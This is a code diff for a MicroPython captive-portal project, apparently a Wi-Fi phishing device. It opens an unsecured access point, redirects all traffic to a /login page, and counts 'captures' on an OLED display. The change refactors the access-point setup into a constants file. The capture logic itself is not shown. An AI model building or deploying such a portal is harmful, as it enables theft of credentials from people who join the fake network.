@@ -8,6 +8,7 @@ import ssd1306
 from phew import server, access_point
 from phew.dns import run_catchall
 from phew.logging import disable_logging_types, LOG_ALL
+import constants_and_configs as cons
 
 # Disable phew logging
 # disable_logging_types(LOG_ALL)
@@ -80,10 +81,7 @@ def animate():
         #Top bar
         oled.rect(0, 0, 128, 15, 0, True)
         oled.text(f"v{VERSION}",0,55,0)
-        
-        
 
-                
         #Executed while waiting for a capture
         if WAITING:
             
@@ -167,25 +165,6 @@ def animate():
 
 #################SERVER CODE#################
 
-'''
-Authmodes
-* 0 || network.AUTH_OPEN         -- OPEN 
-* 1 || network.AUTH_WEP          -- WEP
-* 2 || network.AUTH_WPA-PSK      -- WPA-PSK
-* 3 || network.AUTH_WPA2_PSK     -- WPA2-PSK
-* 4 || network.AUTH_WPA_WPA2_PSK -- WPA/WPA2-PSK
-'''
-# Setting up server and access point
-ACCESS_POINT_ESSID = "WifiPortal"
-PASSWORD = ''
-CHANNEL = 4
-AUTHMODE = network.AUTH_OPEN
-wlan_AP_IF = network.WLAN(network.AP_IF)
-wlan_AP_IF.active(True)
-
-
-wlan_AP_IF.config(essid=ACCESS_POINT_ESSID, password=PASSWORD, channel=CHANNEL, authmode=AUTHMODE)
-
 @server.route("/login", methods=["GET", "POST"])
 def login_page(request):
     global captured_time, WAITING, last_capture, amount_of_captures, DOMAIN
@@ -212,6 +191,8 @@ def login_page(request):
 @server.catchall()
 def catchall(request):
     return server.redirect("http://" + DOMAIN + "/login")
+
+wlan_AP_IF=access_point(cons.AP_SSID)
 
 # Running threads and server
 _thread.start_new_thread(animate, [])
